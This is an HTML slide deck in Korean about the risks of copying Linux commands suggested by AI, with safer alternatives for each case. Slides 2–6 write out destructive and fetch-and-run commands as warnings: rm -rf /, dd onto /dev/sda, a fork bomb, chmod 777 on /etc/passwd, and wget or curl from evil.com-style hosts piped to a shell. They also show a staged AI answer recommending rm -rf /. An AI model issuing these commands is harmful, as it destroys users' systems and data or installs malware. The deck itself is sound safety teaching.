@@ -1,0 +1,854 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AI한테 리눅스 명령어 물어보면 생기는 일</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+KR:wght@300;400;500;700;900&family=Fira+Code:wght@400;500&display=swap');
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    font-family: 'Noto Sans KR', sans-serif;
+    background: #0a0a0a;
+    color: #e0e0e0;
+    overflow: hidden;
+    height: 100vh;
+  }
+
+  .slide {
+    display: none;
+    width: 100vw;
+    height: 100vh;
+    padding: 60px 80px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  .slide.active { display: flex; flex-direction: column; justify-content: center; }
+
+  /* Slide backgrounds */
+  .slide::before {
+    content: '';
+    position: absolute;
+    top: -50%;
+    right: -30%;
+    width: 800px;
+    height: 800px;
+    border-radius: 50%;
+    background: radial-gradient(circle, rgba(99, 102, 241, 0.08) 0%, transparent 70%);
+    pointer-events: none;
+  }
+
+  /* Title slide */
+  .slide-title {
+    text-align: center;
+    justify-content: center;
+    align-items: center;
+    background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+  }
+
+  .slide-title h1 {
+    font-size: 4.5rem;
+    font-weight: 900;
+    background: linear-gradient(135deg, #818cf8, #c084fc, #f472b6);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 20px;
+    letter-spacing: -2px;
+  }
+
+  .slide-title .subtitle {
+    font-size: 1.6rem;
+    color: #9ca3af;
+    font-weight: 300;
+    margin-bottom: 50px;
+  }
+
+  .slide-title .meta {
+    font-size: 1rem;
+    color: #6b7280;
+  }
+
+  /* Content slides */
+  h2 {
+    font-size: 2.6rem;
+    font-weight: 700;
+    margin-bottom: 40px;
+    color: #f3f4f6;
+    position: relative;
+    padding-bottom: 15px;
+  }
+
+  h2::after {
+    content: '';
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    width: 60px;
+    height: 4px;
+    background: linear-gradient(90deg, #818cf8, #c084fc);
+    border-radius: 2px;
+  }
+
+  h3 {
+    font-size: 1.5rem;
+    color: #a5b4fc;
+    margin-bottom: 15px;
+    font-weight: 500;
+  }
+
+  p, li {
+    font-size: 1.35rem;
+    line-height: 1.8;
+    color: #d1d5db;
+  }
+
+  ul { list-style: none; padding: 0; }
+
+  ul li {
+    padding: 10px 0 10px 35px;
+    position: relative;
+  }
+
+  ul li::before {
+    content: '';
+    position: absolute;
+    left: 0;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #818cf8, #c084fc);
+  }
+
+  .highlight {
+    color: #a5b4fc;
+    font-weight: 500;
+  }
+
+  .quote-box {
+    background: linear-gradient(135deg, rgba(99, 102, 241, 0.1), rgba(192, 132, 252, 0.05));
+    border-left: 4px solid #818cf8;
+    padding: 30px 35px;
+    border-radius: 0 12px 12px 0;
+    margin: 20px 0;
+    font-size: 1.4rem;
+    font-style: italic;
+    color: #c4b5fd;
+  }
+
+  .quote-box .author {
+    display: block;
+    margin-top: 15px;
+    font-style: normal;
+    font-size: 1rem;
+    color: #9ca3af;
+  }
+
+  .two-col {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 50px;
+  }
+
+  .col {
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+  }
+
+  .code-block {
+    background: #1e1e2e;
+    border: 1px solid #313244;
+    border-radius: 12px;
+    padding: 25px 30px;
+    font-family: 'Fira Code', monospace;
+    font-size: 1.1rem;
+    line-height: 1.7;
+    color: #cdd6f4;
+    margin: 15px 0;
+    position: relative;
+    overflow-x: auto;
+  }
+
+  .code-block .prompt {
+    color: #a6e3a1;
+  }
+
+  .code-block .comment {
+    color: #6c7086;
+  }
+
+  .code-block .cmd {
+    color: #89b4fa;
+  }
+
+  .code-block .flag {
+    color: #f9e2af;
+  }
+
+  .code-block .string {
+    color: #a6e3a1;
+  }
+
+  .code-block .danger {
+    color: #f38ba8;
+  }
+
+  .tag {
+    display: inline-block;
+    padding: 6px 16px;
+    border-radius: 20px;
+    font-size: 0.95rem;
+    font-weight: 500;
+    margin: 5px 8px 5px 0;
+  }
+
+  .tag-blue { background: rgba(99, 102, 241, 0.15); color: #a5b4fc; border: 1px solid rgba(99, 102, 241, 0.3); }
+  .tag-purple { background: rgba(192, 132, 252, 0.15); color: #d8b4fe; border: 1px solid rgba(192, 132, 252, 0.3); }
+  .tag-pink { background: rgba(244, 114, 182, 0.15); color: #f9a8d4; border: 1px solid rgba(244, 114, 182, 0.3); }
+  .tag-green { background: rgba(74, 222, 128, 0.15); color: #86efac; border: 1px solid rgba(74, 222, 128, 0.3); }
+  .tag-yellow { background: rgba(250, 204, 21, 0.15); color: #fde68a; border: 1px solid rgba(250, 204, 21, 0.3); }
+  .tag-red { background: rgba(248, 113, 113, 0.15); color: #fca5a5; border: 1px solid rgba(248, 113, 113, 0.3); }
+
+  .card-grid {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 25px;
+    margin-top: 10px;
+  }
+
+  .card {
+    background: linear-gradient(135deg, rgba(30, 30, 50, 0.8), rgba(20, 20, 40, 0.6));
+    border: 1px solid #2a2a4a;
+    border-radius: 16px;
+    padding: 30px;
+    transition: transform 0.2s;
+  }
+
+  .card-icon {
+    width: 36px;
+    height: 36px;
+    margin-bottom: 15px;
+    color: #818cf8;
+  }
+  .card-icon svg {
+    width: 100%;
+    height: 100%;
+    stroke: currentColor;
+    fill: none;
+    stroke-width: 1.5;
+    stroke-linecap: round;
+    stroke-linejoin: round;
+  }
+
+  .card h3 {
+    font-size: 1.2rem;
+    margin-bottom: 10px;
+  }
+
+  .card p {
+    font-size: 1.05rem;
+    color: #9ca3af;
+    line-height: 1.6;
+  }
+
+  .warning-box {
+    background: rgba(250, 204, 21, 0.08);
+    border-left: 4px solid #fbbf24;
+    padding: 25px 30px;
+    border-radius: 0 12px 12px 0;
+    margin: 15px 0;
+  }
+
+  .warning-box li::before {
+    background: linear-gradient(135deg, #fbbf24, #f59e0b) !important;
+  }
+
+  .danger-box {
+    background: rgba(248, 113, 113, 0.08);
+    border-left: 4px solid #f87171;
+    padding: 25px 30px;
+    border-radius: 0 12px 12px 0;
+    margin: 15px 0;
+  }
+
+  .danger-box li::before {
+    background: linear-gradient(135deg, #f87171, #ef4444) !important;
+  }
+
+  .pros-cons {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 40px;
+  }
+
+  .pros h3 { color: #86efac; }
+  .cons h3 { color: #fca5a5; }
+
+  .pros li::before { background: #4ade80 !important; }
+  .cons li::before { background: #f87171 !important; }
+
+  /* Navigation */
+  .nav {
+    position: fixed;
+    bottom: 30px;
+    right: 40px;
+    display: flex;
+    gap: 12px;
+    z-index: 100;
+  }
+
+  .nav button {
+    background: rgba(99, 102, 241, 0.2);
+    border: 1px solid rgba(99, 102, 241, 0.4);
+    color: #a5b4fc;
+    padding: 10px 20px;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 1rem;
+    font-family: 'Noto Sans KR', sans-serif;
+    transition: all 0.2s;
+  }
+
+  .nav button:hover {
+    background: rgba(99, 102, 241, 0.4);
+  }
+
+  .slide-counter {
+    position: fixed;
+    bottom: 35px;
+    left: 40px;
+    color: #4b5563;
+    font-size: 0.95rem;
+    z-index: 100;
+  }
+
+  /* Progress bar */
+  .progress {
+    position: fixed;
+    top: 0;
+    left: 0;
+    height: 3px;
+    background: linear-gradient(90deg, #818cf8, #c084fc, #f472b6);
+    transition: width 0.3s;
+    z-index: 100;
+  }
+
+  .demo-terminal {
+    background: #0c0c14;
+    border: 1px solid #2a2a4a;
+    border-radius: 12px;
+    overflow: hidden;
+    margin: 15px 0;
+  }
+
+  .terminal-header {
+    background: #1a1a2e;
+    padding: 10px 16px;
+    display: flex;
+    gap: 8px;
+  }
+
+  .terminal-dot {
+    width: 12px;
+    height: 12px;
+    border-radius: 50%;
+  }
+
+  .terminal-dot.red { background: #f87171; }
+  .terminal-dot.yellow { background: #fbbf24; }
+  .terminal-dot.green { background: #4ade80; }
+
+  .terminal-body {
+    padding: 20px 25px;
+    font-family: 'Fira Code', monospace;
+    font-size: 1.05rem;
+    line-height: 1.8;
+    color: #cdd6f4;
+  }
+
+  .end-slide h2 {
+    font-size: 3rem;
+    text-align: center;
+  }
+
+  .end-slide h2::after {
+    left: 50%;
+    transform: translateX(-50%);
+  }
+
+  .compare-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 30px;
+  }
+
+  .compare-bad {
+    background: rgba(248, 113, 113, 0.06);
+    border: 1px solid rgba(248, 113, 113, 0.25);
+    border-radius: 16px;
+    padding: 28px;
+  }
+
+  .compare-good {
+    background: rgba(74, 222, 128, 0.06);
+    border: 1px solid rgba(74, 222, 128, 0.25);
+    border-radius: 16px;
+    padding: 28px;
+  }
+
+  .compare-bad h3 { color: #f87171; font-size: 1.15rem; margin-bottom: 14px; }
+  .compare-good h3 { color: #4ade80; font-size: 1.15rem; margin-bottom: 14px; }
+
+  .compare-bad p, .compare-good p {
+    font-size: 1rem;
+    line-height: 1.7;
+    color: #9ca3af;
+  }
+
+  .compare-code {
+    font-family: 'Fira Code', monospace;
+    font-size: 0.95rem;
+    background: #1e1e2e;
+    border-radius: 8px;
+    padding: 10px 14px;
+    margin-top: 12px;
+    color: #cdd6f4;
+  }
+
+  .compare-code .danger { color: #f38ba8; }
+  .compare-code .safe { color: #a6e3a1; }
+</style>
+</head>
+<body>
+
+<div class="progress" id="progress"></div>
+
+<!-- Slide 1: Title -->
+<div class="slide slide-title active" id="slide-1">
+  <h1>AI한테 리눅스 명령어<br>물어보면 생기는 일</h1>
+  <p class="subtitle">When You Ask AI for Linux Commands</p>
+  <div style="display:flex; gap:12px; justify-content:center; margin-bottom: 40px;">
+    <span class="tag tag-blue">Linux</span>
+    <span class="tag tag-red">AI Safety</span>
+    <span class="tag tag-pink">Hands-on</span>
+  </div>
+  <p class="meta">2026.04.03</p>
+</div>
+
+<!-- Slide 2: Intro scenario -->
+<div class="slide" id="slide-2">
+  <h2>모르는 명령어, AI한테 물어보죠?</h2>
+  <div class="two-col">
+    <div class="col">
+      <div class="demo-terminal">
+        <div class="terminal-header">
+          <div class="terminal-dot red"></div>
+          <div class="terminal-dot yellow"></div>
+          <div class="terminal-dot green"></div>
+        </div>
+        <div class="terminal-body">
+          <span style="color:#6c7086"># 사용자 질문</span><br>
+          <span style="color:#89b4fa">You:</span> <span style="color:#cdd6f4">디스크 정리 어떻게 해?</span><br>
+          <br>
+          <span style="color:#6c7086"># AI 응답</span><br>
+          <span style="color:#c084fc">AI:</span> <span style="color:#cdd6f4">다음 명령어로 불필요한</span><br>
+          <span style="color:#cdd6f4">&nbsp;&nbsp;&nbsp;&nbsp;파일을 정리할 수 있어요:</span><br>
+          <br>
+          <span style="color:#f38ba8">sudo rm -rf /</span><br>
+          <br>
+          <span style="color:#6c7086"># 실행하면...</span><br>
+          <span style="color:#f38ba8">&#9888; 시스템 전체 삭제</span>
+        </div>
+      </div>
+    </div>
+    <div class="col">
+      <div class="quote-box">
+        AI는 항상 <span style="color:#f9a8d4">동작하는 답</span>을 준다.<br>
+        하지만 <span style="color:#f87171">안전한 답</span>은 아닐 수 있다.
+      </div>
+      <ul style="margin-top: 20px;">
+        <li>AI는 <span class="highlight">컨텍스트 없이</span> 답변</li>
+        <li>명령어의 <span class="highlight">파급력</span>을 모름</li>
+        <li>복붙 한 줄이 <span style="color:#f87171">시스템을 날릴 수 있다</span></li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- Slide 3: Case 1 rm -rf -->
+<div class="slide" id="slide-3">
+  <h2>Case 1: 삭제의 제왕</h2>
+  <div class="two-col">
+    <div class="col">
+      <div class="demo-terminal">
+        <div class="terminal-header">
+          <div class="terminal-dot red"></div>
+          <div class="terminal-dot yellow"></div>
+          <div class="terminal-dot green"></div>
+        </div>
+        <div class="terminal-body">
+          <span class="comment"># AI가 "불필요한 파일 정리"로 추천</span><br>
+          <span class="prompt">$</span> <span class="danger">sudo rm -rf /</span><br>
+          <br>
+          <span class="comment"># 홈 디렉토리 싹 지우기</span><br>
+          <span class="prompt">$</span> <span class="danger">rm -rf ~/*</span><br>
+          <br>
+          <span style="color:#f38ba8">rm: cannot remove '/proc/1/fd/0':</span><br>
+          <span style="color:#f38ba8">Operation not permitted</span><br>
+          <span style="color:#f38ba8">... (수천 개의 에러)</span><br>
+          <br>
+          <span style="color:#6c7086"># 이미 늦었습니다</span>
+        </div>
+      </div>
+    </div>
+    <div class="col">
+      <div class="danger-box">
+        <p style="font-size: 1.15rem; color: #fca5a5; margin-bottom: 12px;"><b>왜 위험한가?</b></p>
+        <ul>
+          <li style="font-size: 1.1rem;"><code style="color:#f38ba8">-r</code> : 재귀적으로 모든 하위 폴더 삭제</li>
+          <li style="font-size: 1.1rem;"><code style="color:#f38ba8">-f</code> : 확인 없이 강제 삭제</li>
+          <li style="font-size: 1.1rem;"><code style="color:#f38ba8">/</code> : 루트 = <b>시스템 전체</b></li>
+          <li style="font-size: 1.1rem;">복구 불가능, 즉시 실행</li>
+        </ul>
+      </div>
+      <div class="warning-box" style="margin-top: 15px;">
+        <p style="font-size: 1.05rem;"><b style="color:#fbbf24;">안전한 대안:</b><br>
+        <code style="color:#a6e3a1; font-family: 'Fira Code', monospace;">find /tmp -mtime +7 -delete</code><br>
+        특정 조건의 파일만 선택적으로 삭제</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Slide 4: Case 2 chmod 777 -->
+<div class="slide" id="slide-4">
+  <h2>Case 2: 권한 만능키</h2>
+  <div class="two-col">
+    <div class="col">
+      <div class="demo-terminal">
+        <div class="terminal-header">
+          <div class="terminal-dot red"></div>
+          <div class="terminal-dot yellow"></div>
+          <div class="terminal-dot green"></div>
+        </div>
+        <div class="terminal-body">
+          <span class="comment"># "권한 오류요? 이렇게 하세요!"</span><br>
+          <span class="prompt">$</span> <span class="danger">chmod 777 -R /var/www</span><br>
+          <br>
+          <span class="comment"># 심지어...</span><br>
+          <span class="prompt">$</span> <span class="danger">chmod 777 /etc/passwd</span><br>
+          <br>
+          <span style="color:#6c7086"># 777 = rwxrwxrwx</span><br>
+          <span style="color:#6c7086"># 모든 사용자: 읽기+쓰기+실행</span><br>
+          <br>
+          <span style="color:#f38ba8">&#9888; 아무나 시스템 파일 수정 가능</span>
+        </div>
+      </div>
+    </div>
+    <div class="col">
+      <div class="danger-box">
+        <p style="font-size: 1.15rem; color: #fca5a5; margin-bottom: 12px;"><b>보안 위험</b></p>
+        <ul>
+          <li style="font-size: 1.1rem;">모든 사용자에게 <span style="color:#f38ba8">읽기/쓰기/실행</span> 권한</li>
+          <li style="font-size: 1.1rem;">악성 사용자가 웹 셸 업로드 가능</li>
+          <li style="font-size: 1.1rem;">시스템 파일 변조 → 루트 탈취</li>
+          <li style="font-size: 1.1rem;">보안 감사에서 즉시 발각</li>
+        </ul>
+      </div>
+      <div class="warning-box" style="margin-top: 15px;">
+        <p style="font-size: 1.05rem;"><b style="color:#fbbf24;">안전한 대안:</b><br>
+        <code style="color:#a6e3a1; font-family: 'Fira Code', monospace;">chmod 644 file.html</code><br>
+        <code style="color:#a6e3a1; font-family: 'Fira Code', monospace;">chown www-data:www-data /var/www</code><br>
+        최소 권한 원칙 (Principle of Least Privilege)</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Slide 5: Case 3 curl | bash -->
+<div class="slide" id="slide-5">
+  <h2>Case 3: 눈 감고 실행</h2>
+  <div class="two-col">
+    <div class="col">
+      <div class="demo-terminal">
+        <div class="terminal-header">
+          <div class="terminal-dot red"></div>
+          <div class="terminal-dot yellow"></div>
+          <div class="terminal-dot green"></div>
+        </div>
+        <div class="terminal-body">
+          <span class="comment"># AI가 소프트웨어 설치법으로 추천</span><br>
+          <span class="prompt">$</span> <span class="danger">curl https://sketchy-site.com/install.sh \</span><br>
+          <span class="danger">&nbsp;&nbsp;| sudo bash</span><br>
+          <br>
+          <span class="comment"># 또는</span><br>
+          <span class="prompt">$</span> <span class="danger">wget http://evil.com/setup -O- | sh</span><br>
+          <br>
+          <span style="color:#6c7086"># 스크립트 내용 확인 없이</span><br>
+          <span style="color:#6c7086"># 루트 권한으로 즉시 실행</span><br>
+          <br>
+          <span style="color:#f38ba8">&#9888; 악성코드 설치 가능</span>
+        </div>
+      </div>
+    </div>
+    <div class="col">
+      <div class="danger-box">
+        <p style="font-size: 1.15rem; color: #fca5a5; margin-bottom: 12px;"><b>왜 위험한가?</b></p>
+        <ul>
+          <li style="font-size: 1.1rem;">스크립트 내용을 <span style="color:#f38ba8">전혀 확인하지 않음</span></li>
+          <li style="font-size: 1.1rem;"><code style="color:#f38ba8">sudo</code>로 루트 권한 부여</li>
+          <li style="font-size: 1.1rem;">백도어, 랜섬웨어 설치 가능</li>
+          <li style="font-size: 1.1rem;">MITM 공격으로 스크립트 변조 가능</li>
+        </ul>
+      </div>
+      <div class="warning-box" style="margin-top: 15px;">
+        <p style="font-size: 1.05rem;"><b style="color:#fbbf24;">안전한 방법:</b><br>
+        <code style="color:#a6e3a1; font-family: 'Fira Code', monospace;">curl -o install.sh https://...</code><br>
+        <code style="color:#a6e3a1; font-family: 'Fira Code', monospace;">cat install.sh</code> &nbsp;← 먼저 확인!<br>
+        <code style="color:#a6e3a1; font-family: 'Fira Code', monospace;">bash install.sh</code></p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Slide 6: Case 4 Fork Bomb & others -->
+<div class="slide" id="slide-6">
+  <h2>Case 4: 숨겨진 폭탄들</h2>
+  <div style="display: grid; grid-template-columns: 1fr; gap: 22px;">
+    <div class="demo-terminal">
+      <div class="terminal-header">
+        <div class="terminal-dot red"></div>
+        <div class="terminal-dot yellow"></div>
+        <div class="terminal-dot green"></div>
+      </div>
+      <div class="terminal-body" style="font-size: 1rem;">
+        <span class="comment"># Fork Bomb — 시스템 프로세스 무한 생성 → 멈춤</span><br>
+        <span class="prompt">$</span> <span class="danger">:(){ :|:& };:</span><br>
+        <br>
+        <span class="comment"># 디스크 전체 덮어쓰기 (복구 불가)</span><br>
+        <span class="prompt">$</span> <span class="danger">dd if=/dev/zero of=/dev/sda</span><br>
+        <br>
+        <span class="comment"># 또 다른 blind execution</span><br>
+        <span class="prompt">$</span> <span class="danger">wget http://malicious.example/x -O- | sh</span>
+      </div>
+    </div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px;">
+      <div class="danger-box" style="padding: 20px 22px;">
+        <p style="color:#fca5a5; font-size: 1rem; font-weight: 700; margin-bottom: 8px;">Fork Bomb</p>
+        <p style="font-size: 0.95rem; color: #9ca3af;">자기 자신을 무한 복제<br>RAM/CPU 고갈 → 시스템 다운<br>재부팅 외 방법 없음</p>
+      </div>
+      <div class="danger-box" style="padding: 20px 22px;">
+        <p style="color:#fca5a5; font-size: 1rem; font-weight: 700; margin-bottom: 8px;">dd 디스크 와이프</p>
+        <p style="font-size: 0.95rem; color: #9ca3af;">0으로 디스크 전체 덮어씀<br>OS, 데이터 모두 삭제<br>복구 거의 불가능</p>
+      </div>
+      <div class="danger-box" style="padding: 20px 22px;">
+        <p style="color:#fca5a5; font-size: 1rem; font-weight: 700; margin-bottom: 8px;">wget | sh</p>
+        <p style="font-size: 0.95rem; color: #9ca3af;">curl|bash와 동일 위험<br>출처 불명 스크립트<br>루트 권한 실행</p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- Slide 7: Why AI gives dangerous answers -->
+<div class="slide" id="slide-7">
+  <h2>AI는 왜 위험한 답을 줄까?</h2>
+  <div class="pros-cons">
+    <div class="cons">
+      <h3>AI의 한계</h3>
+      <ul>
+        <li><span style="color:#a5b4fc">"동작하는 답"</span> ≠ <span style="color:#f87171">"안전한 답"</span></li>
+        <li>사용자 환경의 <span style="color:#fca5a5">컨텍스트 부재</span></li>
+        <li>최신 보안 관행 미반영</li>
+        <li>명령어 파급력 인식 부족</li>
+        <li>훈련 데이터의 부정확한 예시</li>
+      </ul>
+    </div>
+    <div class="pros" style="--pros-color: #f87171;">
+      <h3 style="color: #fbbf24;">사용자의 실수</h3>
+      <ul>
+        <li style="font-size: 1.2rem;">이해 없는 <span style="color:#fbbf24">복붙 습관</span></li>
+        <li style="font-size: 1.2rem;">명령어 의미 <span style="color:#fbbf24">미확인</span></li>
+        <li style="font-size: 1.2rem;"><span style="color:#fbbf24">root 권한</span> 남용</li>
+        <li style="font-size: 1.2rem;">실서버에서 직접 <span style="color:#fbbf24">테스트</span></li>
+        <li style="font-size: 1.2rem;">AI 답변을 <span style="color:#fbbf24">맹신</span></li>
+      </ul>
+    </div>
+  </div>
+  <div class="warning-box" style="margin-top: 25px;">
+    <p style="font-size: 1.15rem;"><b style="color:#fbbf24;">핵심:</b> AI는 "동작 가능성"을 최적화하도록 훈련됨. "안전성"은 <b>사용자가 검증</b>해야 한다.</p>
+  </div>
+</div>
+
+<!-- Slide 8: Safe usage -->
+<div class="slide" id="slide-8">
+  <h2>안전하게 AI 활용하기</h2>
+  <div class="card-grid" style="grid-template-columns: 1fr 1fr;">
+    <div class="card">
+      <div class="card-icon">
+        <svg viewBox="0 0 24 24">
+          <circle cx="11" cy="11" r="8"/>
+          <path d="M21 21l-4.35-4.35M11 8v6M8 11h6"/>
+        </svg>
+      </div>
+      <h3>1. 먼저 확인</h3>
+      <p>
+        <code style="color:#a5b4fc; font-family:'Fira Code',monospace;">man rm</code>,
+        <code style="color:#a5b4fc; font-family:'Fira Code',monospace;">--help</code>,
+        <code style="color:#a5b4fc; font-family:'Fira Code',monospace;">--dry-run</code><br>
+        명령어 동작을 실행 전에 반드시 확인
+      </p>
+    </div>
+    <div class="card">
+      <div class="card-icon">
+        <svg viewBox="0 0 24 24">
+          <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z"/>
+          <path d="M8 10h8M8 14h5"/>
+        </svg>
+      </div>
+      <h3>2. 되물어보기</h3>
+      <p>
+        "이 명령어 실행하면 어떤 일이 생겨?"<br>
+        AI에게 역질문으로 파급력 파악
+      </p>
+    </div>
+    <div class="card">
+      <div class="card-icon">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+        </svg>
+      </div>
+      <h3>3. 컨텍스트 제공</h3>
+      <p>
+        "초보자가 안전하게 쓸 수 있는 방법으로"<br>
+        프롬프트에 안전 조건을 명시
+      </p>
+    </div>
+    <div class="card">
+      <div class="card-icon">
+        <svg viewBox="0 0 24 24">
+          <rect x="2" y="3" width="20" height="14" rx="2" ry="2"/>
+          <path d="M8 21h8M12 17v4"/>
+        </svg>
+      </div>
+      <h3>4. VM에서 먼저</h3>
+      <p>
+        실서버 적용 전 가상환경에서 테스트<br>
+        실수해도 재설치로 복구 가능
+      </p>
+    </div>
+  </div>
+</div>
+
+<!-- Slide 9: Good vs Bad prompt -->
+<div class="slide" id="slide-9">
+  <h2>프롬프트가 답을 바꾼다</h2>
+  <div class="compare-grid">
+    <div class="compare-bad">
+      <h3>
+        <svg style="width:18px;height:18px;display:inline;vertical-align:middle;margin-right:6px;stroke:#f87171;fill:none;stroke-width:2;stroke-linecap:round" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M15 9l-6 6M9 9l6 6"/></svg>
+        나쁜 프롬프트
+      </h3>
+      <p>"파일 정리해줘"</p>
+      <div class="compare-code"><span class="danger">rm -rf /tmp/*</span></div>
+      <p style="margin-top: 12px; font-size: 0.95rem;">/tmp에 있는 다른 프로그램의 소켓, 락 파일도 삭제</p>
+    </div>
+    <div class="compare-good">
+      <h3>
+        <svg style="width:18px;height:18px;display:inline;vertical-align:middle;margin-right:6px;stroke:#4ade80;fill:none;stroke-width:2;stroke-linecap:round" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M9 12l2 2 4-4"/></svg>
+        좋은 프롬프트
+      </h3>
+      <p>"Ubuntu 22.04에서 /tmp의 7일 이상 된 파일만 안전하게 삭제. 실행 전 확인 가능하게"</p>
+      <div class="compare-code"><span class="safe">find /tmp -mtime +7 -exec ls -l {} \;</span><br><span style="color:#6c7086"># 확인 후</span><br><span class="safe">find /tmp -mtime +7 -delete</span></div>
+    </div>
+    <div class="compare-bad">
+      <h3>
+        <svg style="width:18px;height:18px;display:inline;vertical-align:middle;margin-right:6px;stroke:#f87171;fill:none;stroke-width:2;stroke-linecap:round" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M15 9l-6 6M9 9l6 6"/></svg>
+        나쁜 프롬프트
+      </h3>
+      <p>"권한 오류 해결해줘"</p>
+      <div class="compare-code"><span class="danger">chmod 777 -R /var/www</span></div>
+      <p style="margin-top: 12px; font-size: 0.95rem;">모든 사용자에게 전체 권한 → 보안 취약점</p>
+    </div>
+    <div class="compare-good">
+      <h3>
+        <svg style="width:18px;height:18px;display:inline;vertical-align:middle;margin-right:6px;stroke:#4ade80;fill:none;stroke-width:2;stroke-linecap:round" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M9 12l2 2 4-4"/></svg>
+        좋은 프롬프트
+      </h3>
+      <p>"nginx가 /var/www/html을 읽을 수 있도록 최소 권한으로 설정하는 방법"</p>
+      <div class="compare-code"><span class="safe">chmod 644 /var/www/html/*.html</span><br><span class="safe">chown www-data:www-data /var/www/html</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- Slide 10: Summary -->
+<div class="slide end-slide" id="slide-10">
+  <h2>정리</h2>
+  <div style="max-width: 800px; margin: 0 auto;">
+    <ul style="margin-bottom: 40px;">
+      <li>AI는 강력한 도구지만, <span class="highlight">리눅스에서는 한 줄이 시스템을 날릴 수 있다</span></li>
+      <li>복붙 전에 반드시 <span class="highlight">명령어의 의미를 확인</span>하자</li>
+      <li><span style="color:#f87171">"동작하는 답"</span> &#8800; <span style="color:#86efac">"안전한 답"</span></li>
+      <li>프롬프트를 잘 쓰면 <span class="highlight">안전한 답을 받을 수 있다</span></li>
+      <li>AI는 도구, <span class="highlight">판단은 내가</span></li>
+    </ul>
+    <div style="text-align: center; margin-top: 50px;">
+      <div style="font-size: 2rem; margin-bottom: 15px; color: #818cf8;">Q &amp; A</div>
+      <p style="color: #6b7280; font-size: 1.1rem;">감사합니다</p>
+    </div>
+  </div>
+</div>
+
+<!-- Navigation -->
+<div class="nav">
+  <button onclick="prevSlide()">&#8592; Prev</button>
+  <button onclick="nextSlide()">Next &#8594;</button>
+</div>
+<div class="slide-counter" id="counter">1 / 10</div>
+
+<script>
+  let current = 1;
+  const total = 10;
+
+  function showSlide(n) {
+    document.querySelectorAll('.slide').forEach(s => s.classList.remove('active'));
+    document.getElementById(`slide-${n}`).classList.add('active');
+    document.getElementById('counter').textContent = `${n} / ${total}`;
+    document.getElementById('progress').style.width = `${(n / total) * 100}%`;
+  }
+
+  function nextSlide() {
+    if (current < total) { current++; showSlide(current); }
+  }
+
+  function prevSlide() {
+    if (current > 1) { current--; showSlide(current); }
+  }
+
+  document.addEventListener('keydown', (e) => {
+    if (e.key === 'ArrowRight' || e.key === ' ' || e.key === 'Enter') {
+      e.preventDefault();
+      nextSlide();
+    }
+    if (e.key === 'ArrowLeft' || e.key === 'Backspace') {
+      e.preventDefault();
+      prevSlide();
+    }
+  });
+
+  // Touch support
+  let touchStartX = 0;
+  document.addEventListener('touchstart', e => touchStartX = e.touches[0].clientX);
+  document.addEventListener('touchend', e => {
+    const diff = touchStartX - e.changedTouches[0].clientX;
+    if (diff > 50) nextSlide();
+    if (diff < -50) prevSlide();
+  });
+</script>
+
+</body>
+</html>
